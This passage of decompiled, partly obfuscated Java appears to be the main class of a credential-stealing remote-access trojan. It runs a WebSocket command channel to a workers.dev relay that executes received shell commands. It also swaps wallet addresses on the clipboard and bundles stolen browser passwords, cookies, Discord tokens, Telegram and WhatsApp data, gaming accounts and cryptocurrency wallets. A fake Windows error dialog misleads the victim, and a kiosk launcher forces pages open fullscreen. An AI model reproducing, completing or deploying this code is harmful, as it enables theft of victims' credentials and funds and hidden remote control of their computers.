                                                            webSocket.send($S.d(390) + n4 + $S.d(396) + x.c.a(exception.getMessage() != null ? exception.getMessage() : $S.d(397)) + "\"}");
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    });
                                }

                                @Override
                                public final void onMessage(WebSocket webSocket, ByteString byteString) {
                                }

                                @Override
                                public final void onClosing(WebSocket webSocket, int n2, String string) {
                                    webSocket.close(1000, null);
                                }

                                @Override
                                public final void onClosed(WebSocket webSocket, int n2, String string) {
                                    this.b.set(true);
                                    this.c.countDown();
                                }

                                @Override
                                public final void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                                    this.b.set(true);
                                    this.c.countDown();
                                }
                            });
                            countDownLatch.await(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
                            executorService.shutdown();
                            okHttpClient.dispatcher().executorService().shutdown();
                        }
                        catch (Exception exception) {}
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (InterruptedException interruptedException) {
                            return;
                        }
                    }
                }
            }, "files-rc");
            ((Thread)object).setDaemon(true);
            ((Thread)object).start();
            object4 = string;
            object = config.buildId;
            object4 = object4 != null && !((String)object4).isEmpty() ? object4 : "wss://screen-relay.abelbiffle.workers.dev";
            object = new Thread(new Runnable(){
                private /* synthetic */ String a;
                private /* synthetic */ String b;
                {
                    this.a = string;
                    this.b = string2;
                }

                @Override
                public final void run() {
                    String string = this.b;
                    String string2 = this.a;
                    while (true) {
                        try {
                            Object object = string;
                            Object object2 = string2;
                            object2 = (String)object + $S.d(236) + (String)object2 + $S.d(246);
                            object = new AtomicBoolean(false);
                            CountDownLatch countDownLatch = new CountDownLatch(1);
                            OkHttpClient okHttpClient = new OkHttpClient.Builder().pingInterval(20L, TimeUnit.SECONDS).build();
                            object2 = new Request.Builder().url((String)object2).build();
                            okHttpClient.newWebSocket((Request)object2, new WebSocketListener((AtomicBoolean)object, countDownLatch){
                                private /* synthetic */ AtomicBoolean a;
                                private /* synthetic */ CountDownLatch b;
                                {
                                    this.a = atomicBoolean;
                                    this.b = countDownLatch;
                                }

                                @Override
                                public final void onOpen(WebSocket webSocket, Response response) {
                                }

                                @Override
                                public final void onMessage(WebSocket webSocket, String string) {
                                    try {
                                        String string2 = x.b.a(string, "t");
                                        if ($S.d(247).equals(string2) && (string2 = x.b.a(string, $S.d(247))) != null) {
                                            String string3;
                                            String string4 = $S.d(248);
                                            boolean bl = true;
                                            try {
                                                if ($S.d(249).equals(string2)) {
                                                    Runtime.getRuntime().exec($S.d(250));
                                                } else if ($S.d(251).equals(string2)) {
                                                    Runtime.getRuntime().exec($S.d(252));
                                                } else if ($S.d(253).equals(string2)) {
                                                    Runtime.getRuntime().exec($S.d(254));
                                                } else if ($S.d(255).equals(string2)) {
                                                    Runtime.getRuntime().exec($S.d(256));
                                                } else if ($S.d(257).equals(string2)) {
                                                    string3 = x.b.a(string, $S.d(94));
                                                    if (string3 != null && !string3.isEmpty()) {
                                                        try {
                                                            Desktop.getDesktop().browse(new URI(string3));
                                                        }
                                                        catch (Exception exception) {
                                                            Runtime.getRuntime().exec(new String[]{$S.d(247), "/c", $S.d(258), string3});
                                                        }
                                                    } else {
                                                        bl = false;
                                                        string4 = $S.d(259);
                                                    }
                                                } else if ($S.d(260).equals(string2)) {
                                                    string3 = x.b.a(string, $S.d(261));
                                                    if (string3 == null || string3.isEmpty()) {
                                                        string3 = x.b.a(string, $S.d(247));
                                                    }
                                                    if (string3 != null && !string3.isEmpty()) {
                                                        Runtime.getRuntime().exec(new String[]{$S.d(247), "/c", string3});
                                                    } else {
                                                        bl = false;
                                                        string4 = $S.d(262);
                                                    }
                                                } else {
                                                    bl = false;
                                                    string4 = $S.d(263) + string2;
                                                }
                                            }
                                            catch (Exception exception) {
                                                bl = false;
                                                string4 = exception.getMessage() != null ? exception.getMessage() : $S.d(264);
                                            }
                                            string3 = $S.d(265) + (bl ? $S.d(266) : $S.d(267)) + $S.d(268) + x.b.a(string2) + $S.d(269) + x.b.a(string4) + "\"}";
                                            webSocket.send(string3);
                                        }
                                        return;
                                    }
                                    catch (Exception exception) {
                                        return;
                                    }
                                }

                                @Override
                                public final void onMessage(WebSocket webSocket, ByteString byteString) {
                                }

                                @Override
                                public final void onClosing(WebSocket webSocket, int n2, String string) {
                                    webSocket.close(1000, null);
                                }

                                @Override
                                public final void onClosed(WebSocket webSocket, int n2, String string) {
                                    this.a.set(true);
                                    this.b.countDown();
                                }

                                @Override
                                public final void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                                    this.a.set(true);
                                    this.b.countDown();
                                }
                            });
                            countDownLatch.await(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
                            okHttpClient.dispatcher().executorService().shutdown();
                        }
                        catch (Exception exception) {}
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (InterruptedException interruptedException) {
                            return;
                        }
                    }
                }
            }, "cmd-rc");
            ((Thread)object).setDaemon(true);
            ((Thread)object).start();
        }
        h.a(config, (h.b)object2, false);
        boolean bl4 = bl = config.features.remoteControl || bl2 || config.features.clipper && config.features.clipperAddresses != null && !config.features.clipperAddresses.isEmpty();
        if (config.features.clipper && config.features.clipperAddresses != null && !config.features.clipperAddresses.isEmpty()) {
            q.a(config.features.clipperAddresses);
        }
        if (bl) {
            try {
                Thread.currentThread().join();
                return;
            }
            catch (InterruptedException interruptedException) {}
        }
    }

    private static boolean a(String stringArray, String[] stringArray2, String object) {
        try {
            object = new ArrayList<String[]>();
            object.add(stringArray);
            stringArray = stringArray2;
            int cfr_ignored_0 = stringArray2.length;
            for (int i2 = 0; i2 < 19; ++i2) {
                String string = stringArray[i2];
                object.add(string);
            }
            new ProcessBuilder((List<String>)object).redirectErrorStream(true).start();
            return true;
        }
        catch (Exception exception) {
            return false;
        }
    }

    private static String a(String string, String string2) {
        if (string != null && !string.isEmpty()) {
            return string;
        }
        return string2;
    }

    private static /* synthetic */ void a(List object, h.b b2) {
        try {
            object = y.a((List<l.c>)object);
            if (object != null) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.t = true;
                    b2.N = object;
                }
                b2.Z.add(new h.a("Gaming/Riot.txt", y.a((y.a)object).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void b(List list2, h.b b2) {
        try {
            list2 = x.a((List<l.c>)list2);
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.r = list2.size();
                    b2.L.addAll(list2);
                }
                b2.Z.add(new h.a("Reddit/accounts.txt", x.b(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void c(List list2, h.b b2) {
        try {
            list2 = ab.a((List<l.c>)list2);
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.q = list2.size();
                    b2.K.addAll(list2);
                }
                b2.Z.add(new h.a("Spotify/accounts.txt", ab.b(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void d(List list2, h.b b2) {
        try {
            list2 = v.a((List<l.c>)list2);
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.o = list2.size();
                    b2.I.addAll(list2);
                }
                b2.Z.add(new h.a("Instagram/accounts.txt", v.b(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void e(List list2, h.b b2) {
        try {
            list2 = af.a((List<l.c>)list2);
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.p = list2.size();
                    b2.J.addAll(list2);
                }
                b2.Z.add(new h.a("TikTok/accounts.txt", af.b(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void f(List list2, h.b b2) {
        try {
            list2 = z.a((List<l.c>)list2);
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.n = list2.size();
                    b2.H.addAll(list2);
                }
                b2.Z.add(new h.a("Roblox/accounts.txt", z.b(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void a(h.b b2) {
        try {
            List<w.a> list2 = w.a();
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.s = list2.size();
                    b2.M.addAll(list2);
                }
                b2.Z.add(new h.a("Minecraft/accounts.txt", w.a(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void b(h.b b2) {
        try {
            List<ac.a> list2 = ac.a();
            if (!list2.isEmpty()) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.m = list2.size();
                    b2.G.addAll(list2);
                }
                b2.Z.add(new h.a("Steam/accounts_summary.txt", ac.a(list2).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void c(h.b b2) {
        try {
            Object object = ad.a();
            if (!object.isEmpty()) {
                Object object2 = b2;
                synchronized (object2) {
                    b2.Y = object.size();
                }
                object2 = object.iterator();
                while (object2.hasNext()) {
                    object = (ad.a)object2.next();
                    try {
                        byte[] byArray = Files.readAllBytes(Paths.get(((ad.a)object).a, new String[0]));
                        b2.Z.add(new h.a("StolenFiles/" + ((ad.a)object).b, byArray));
                    }
                    catch (Exception exception) {}
                }
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void d(h.b b2) {
        try {
            Object object = ah.a();
            if (!object.isEmpty()) {
                Object object2 = b2;
                synchronized (object2) {
                    b2.X.addAll((Collection<ah.b>)object);
                }
                object2 = object.iterator();
                while (object2.hasNext()) {
                    object = (ah.b)object2.next();
                    b2.Z.add(new h.a("VPN/" + ((ah.b)object).a + ".txt", ((ah.b)object).b.getBytes("UTF-8")));
                }
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void e(h.b b2) {
        try {
            s.a a2 = s.a();
            if (a2.a) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.W = a2;
                }
                b2.Z.add(new h.a("Gaming/EpicGames.txt", a2.b.getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void f(h.b b2) {
        try {
            aa.a a2 = aa.a();
            if (a2 != null) {
                Object object = b2;
                synchronized (object) {
                    b2.B = true;
                    b2.V = a2;
                }
                object = "Email: " + (a2.b != null ? a2.b : "") + "\nToken: " + (a2.c != null ? a2.c : "") + "\n";
                b2.Z.add(new h.a("Gaming/Rockstar.txt", ((String)object).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void g(h.b b2) {
        try {
            r.a a2 = r.a();
            if (a2 != null) {
                Object object = b2;
                synchronized (object) {
                    b2.A = true;
                    b2.U = a2;
                }
                object = "Email: " + (a2.c != null ? a2.c : "") + "\nToken: " + (a2.b != null ? a2.b : "") + "\n";
                b2.Z.add(new h.a("Gaming/EA.txt", ((String)object).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void h(h.b b2) {
        try {
            ag.a a2 = ag.a();
            if (a2 != null) {
                Object object = b2;
                synchronized (object) {
                    b2.z = true;
                    b2.T = a2;
                }
                object = "Email: " + (a2.c != null ? a2.c : "") + "\nToken: " + (a2.b != null ? a2.b : "") + "\n";
                b2.Z.add(new h.a("Gaming/Ubisoft.txt", ((String)object).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void i(h.b b2) {
        try {
            ai.b object2 = ai.a();
            if (object2 != null) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.y = true;
                    b2.S = object2;
                }
                for (ai.a a2 : object2.b) {
                    try {
                        byte[] byArray = Files.readAllBytes(Paths.get(a2.a, new String[0]));
                        b2.Z.add(new h.a("WhatsApp/" + a2.b, byArray));
                    }
                    catch (Exception exception) {}
                }
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void j(h.b b2) {
        try {
            ae.b object2 = ae.a();
            if (object2 != null) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.x = true;
                    b2.R = object2;
                }
                for (ae.a a2 : object2.b) {
                    try {
                        byte[] byArray = Files.readAllBytes(Paths.get(a2.a, new String[0]));
                        b2.Z.add(new h.a("Telegram/tdata/" + a2.b, byArray));
                    }
                    catch (Exception exception) {}
                }
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void k(h.b b2) {
        try {
            t.a a2 = t.a();
            if (a2 != null) {
                h.b b3 = b2;
                synchronized (b3) {
                    b2.w = true;
                    b2.Q = a2;
                }
                b2.Z.add(new h.a("FileZilla/servers.txt", t.a(a2.b).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void l(h.b b2) {
        try {
            o.a a2 = o.a();
            if (a2 != null) {
                Object object = b2;
                synchronized (object) {
                    b2.v = true;
                    b2.P = a2;
                }
                object = new StringBuilder();
                ((StringBuilder)object).append("Accounts  : ").append(String.join((CharSequence)", ", a2.b)).append("\n");
                ((StringBuilder)object).append("Last Login: ").append(a2.c != null ? a2.c : "").append("\n");
                b2.Z.add(new h.a("Gaming/BattleNet.txt", ((StringBuilder)object).toString().getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void m(h.b b2) {
        try {
            u.a a2 = u.a();
            if (a2 != null) {
                Object object = b2;
                synchronized (object) {
                    b2.u = true;
                    b2.O = a2;
                }
                object = "Username: " + a2.b + "\nPassword: " + a2.c + "\n";
                b2.Z.add(new h.a("Gaming/Growtopia.txt", ((String)object).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void n(h.b b2) {
        try {
            p.a a2 = p.a();
            if (a2 != null) {
                Object object = b2;
                synchronized (object) {
                    b2.C = a2.a;
                }
                object = "Type   : " + a2.b + "\nContent: " + a2.a + "\n";
                b2.Z.add(new h.a("System/Clipboard.txt", ((String)object).getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void o(h.b b2) {
        try {
            Object object = new ArrayList<aj.b>();
            aj.a("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn", object);
            aj.a("MetaMask Edge", "ejbalbakoplchlghecdalmeeeajnimhm", object);
            aj.b("Exodus", System.getenv("APPDATA") + "\\Exodus\\exodus.wallet", object);
            aj.b("Electrum", System.getenv("APPDATA") + "\\Electrum\\wallets", object);
            aj.b("Atomic", System.getenv("APPDATA") + "\\atomic\\Local Storage\\leveldb", object);
            aj.b("Jaxx", System.getenv("APPDATA") + "\\com.liberty.jaxx\\IndexedDB", object);
            aj.b("Coinomi", System.getenv("LOCALAPPDATA") + "\\Coinomi\\Coinomi\\wallets", object);
            aj.b("Wasabi", System.getenv("APPDATA") + "\\WalletWasabi\\Client\\Wallets", object);
            aj.b("Armory", System.getenv("APPDATA") + "\\Armory", object);
            aj.b("Zcash", System.getenv("APPDATA") + "\\Zcash", object);
            Object object2 = b2;
            synchronized (object2) {
                b2.l = object.size();
            }
            object2 = object.iterator();
            while (object2.hasNext()) {
                object = (aj.b)object2.next();
                for (aj.a a2 : ((aj.b)object).b) {
                    b2.Z.add(new h.a("Wallets/" + ((aj.b)object).a + "/" + a2.a, a2.b));
                }
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void p(h.b b2) {
        try {
            Object object = n.a();
            Object object2 = b2;
            synchronized (object2) {
                b2.F.addAll((Collection<n.a>)object);
            }
            if (!object.isEmpty()) {
                object2 = new StringBuilder();
                object = object.iterator();
                while (object.hasNext()) {
                    n.a a2 = (n.a)object.next();
                    ((StringBuilder)object2).append("Username: ").append(a2.c).append("\n");
                    ((StringBuilder)object2).append("ID      : ").append(a2.b).append("\n");
                    ((StringBuilder)object2).append("Email   : ").append(a2.d).append("\n");
                    ((StringBuilder)object2).append("Phone   : ").append(a2.e).append("\n");
                    ((StringBuilder)object2).append("Nitro   : ").append(a2.f).append("\n");
                    ((StringBuilder)object2).append("Badges  : ").append(a2.h).append("\n");
                    ((StringBuilder)object2).append("Billing : ").append(a2.g).append("\n");
                    ((StringBuilder)object2).append("Token   : ").append(a2.a).append("\n");
                    if (!a2.k.isEmpty()) {
                        ((StringBuilder)object2).append("HQ Guilds: ").append(String.join((CharSequence)", ", a2.k)).append("\n");
                    }
                    if (!a2.j.isEmpty()) {
                        ((StringBuilder)object2).append("HQ Friends: ").append(String.join((CharSequence)", ", a2.j)).append("\n");
                    }
                    ((StringBuilder)object2).append("---\n");
                }
                b2.Z.add(new h.a("Discord/tokens.txt", ((StringBuilder)object2).toString().getBytes("UTF-8")));
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    /*
     * WARNING - void declaration
     */
    private static /* synthetic */ void a(Config object, h.b b2, List[] listArray, CountDownLatch countDownLatch) {
        try {
            boolean n2 = ((Config)((Object)object)).features.autofills;
            object = l.a(((Config)((Object)object)).features.cookies, ((Config)((Object)object)).features.passwords, ((Config)((Object)object)).features.history, n2);
            boolean bl = false;
            int n3 = 0;
            int n4 = 0;
            int n5 = 0;
            for (l.b b3 : object) {
                String string;
                var4_8 += b3.c.size();
                n3 += b3.d.size();
                n4 += b3.e.size();
                n5 += b3.f.size();
                String string2 = b3.a.replaceAll("[^a-zA-Z0-9_\\- ]", "_");
                String string3 = b3.b.replaceAll("[^a-zA-Z0-9_\\- ]", "_");
                if (!b3.c.isEmpty()) {
                    string = "Browsers/" + string2 + "/" + string3 + "/Cookies.txt";
                    b2.Z.add(new h.a(string, l.a(b3.c).getBytes("UTF-8")));
                }
                if (!b3.d.isEmpty()) {
                    string = "Browsers/" + string2 + "/" + string3 + "/Passwords.txt";
                    b2.Z.add(new h.a(string, l.b(b3.d).getBytes("UTF-8")));
                }
                if (!b3.e.isEmpty()) {
                    string = "Browsers/" + string2 + "/" + string3 + "/History.txt";
                    b2.Z.add(new h.a(string, l.c(b3.e).getBytes("UTF-8")));
                }
                if (b3.f.isEmpty()) continue;
                string = "Browsers/" + string2 + "/" + string3 + "/AutoFill.txt";
                b2.Z.add(new h.a(string, l.d(b3.f).getBytes("UTF-8")));
            }
            h.b b4 = b2;
            synchronized (b4) {
                void var4_8;
                b2.f = var4_8;
                b2.g = n3;
                b2.j = n4;
                b2.i = n5;
                b2.D = l.a(object, true);
                b2.E = l.a(object, false);
                listArray[0] = object;
            }
            return;
        }
        catch (Throwable throwable) {
            return;
        }
        finally {
            countDownLatch.countDown();
        }
    }

    private static /* synthetic */ void q(h.b b2) {
        try {
            byte[] byArray = g.a();
            if (byArray != null) {
                b2.e = byArray;
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void r(h.b object) {
        try {
            Object object2 = j.a();
            String string = j.b();
            ((h.b)object).c = string != null ? string : "unknown";
            h.b b2 = object;
            j j2 = object2;
            object2 = string;
            object = j2;
            b2.d = String.format("Hostname   : %s\nUsername   : %s\nOS         : %s\nArch       : %s\nCPU        : %s\nGPU        : %s\nRAM        : %s\nDisk       : %s total / %s free\nLocal IP   : %s\nPublic IP  : %s\nMAC        : %s\nLanguage   : %s\nResolution : %s\nAntivirus  : %s\nVM         : %s", ((j)object).a, ((j)object).b, ((j)object).c, ((j)object).d, ((j)object).e, ((j)object).f, ((j)object).g, ((j)object).h, ((j)object).i, ((j)object).j, object2 != null ? object2 : "unknown", ((j)object).k, ((j)object).l, ((j)object).m, ((j)object).n, ((j)object).o ? "Yes" : "No");
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static /* synthetic */ void b(String string, String string2) {
        try {
            i.a(string, string2);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    static /* synthetic */ void a() {
        try {
            JOptionPane.showMessageDialog(null, "The application was unable to start correctly (0xc000007b).\nClick OK to close the application.", "Windows", 0);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    static /* synthetic */ void a(String string) {
        block10: {
            String[] stringArray;
            String string2 = Main.a(System.getenv("LOCALAPPDATA"), "C:\\Users\\" + Main.a(System.getenv("USERNAME"), "User") + "\\AppData\\Local");
            String string3 = Main.a(System.getenv("PROGRAMFILES(X86)"), "C:\\Program Files (x86)");
            String string4 = Main.a(System.getenv("PROGRAMFILES"), "C:\\Program Files");
            String[] stringArray2 = new String[]{string2 + "\\Microsoft\\Edge\\Application\\msedge.exe", string4 + "\\Microsoft\\Edge\\Application\\msedge.exe", string3 + "\\Microsoft\\Edge\\Application\\msedge.exe"};
            String[] stringArray3 = stringArray2;
            stringArray3 = stringArray2;
            int cfr_ignored_0 = stringArray2.length;
            for (int i2 = 0; i2 < 3; ++i2) {
                stringArray = stringArray3[i2];
                if (!new File((String)stringArray).exists()) continue;
                ArrayList<String> arrayList = new ArrayList<String>();
                arrayList.add((String)stringArray);
                arrayList.add("--kiosk");
                arrayList.add(string);
                arrayList.add("--edge-kiosk-type=fullscreen");
                arrayList.add("--no-first-run");
                arrayList.add("--disable-infobars");
                arrayList.add("--noerrdialogs");
                arrayList.add("--disable-session-crashed-bubble");
                arrayList.add("--autoplay-policy=no-user-gesture-required");
                arrayList.add("--enable-gpu-rasterization");
                arrayList.add("--ignore-gpu-blocklist");
                arrayList.add("--enable-zero-copy");
                arrayList.add("--disable-software-rasterizer");
                try {
                    new ProcessBuilder(arrayList).redirectErrorStream(true).start();
                    return;
                }
                catch (Exception exception) {}
            }
            stringArray3 = System.getProperty("java.io.tmpdir") + "\\_gp_" + Integer.toHexString(string.hashCode() & 0xFFFF);
            try {
                new File((String)stringArray3).mkdirs();
            }
            catch (Exception exception) {}
            stringArray3 = new String[]{"--kiosk", string, "--user-data-dir=" + (String)stringArray3, "--no-first-run", "--disable-infobars", "--disable-session-crashed-bubble", "--noerrdialogs", "--disable-translate", "--disable-extensions", "--disable-background-networking", "--disable-sync", "--disable-default-apps", "--no-default-browser-check", "--disable-popup-blocking", "--autoplay-policy=no-user-gesture-required", "--enable-gpu-rasterization", "--ignore-gpu-blocklist", "--enable-zero-copy", "--disable-software-rasterizer"};
            String[] stringArray4 = new String[]{string2 + "\\Google\\Chrome\\Application\\chrome.exe", string4 + "\\Google\\Chrome\\Application\\chrome.exe", string3 + "\\Google\\Chrome\\Application\\chrome.exe", string2 + "\\Google\\Chrome SxS\\Application\\chrome.exe", string2 + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"};
            stringArray = stringArray4;
            int cfr_ignored_1 = stringArray4.length;
            for (int i3 = 0; i3 < 5; ++i3) {
                string3 = stringArray[i3];
                if (!new File(string3).exists() || !Main.a(string3, stringArray3, null)) {
                    continue;
                }
                break block10;
            }
            try {
                if (Desktop.isDesktopSupported()) {
                    Desktop.getDesktop().browse(new URI(string));
                }
                return;
            }
            catch (Exception exception) {}
        }
    }
}

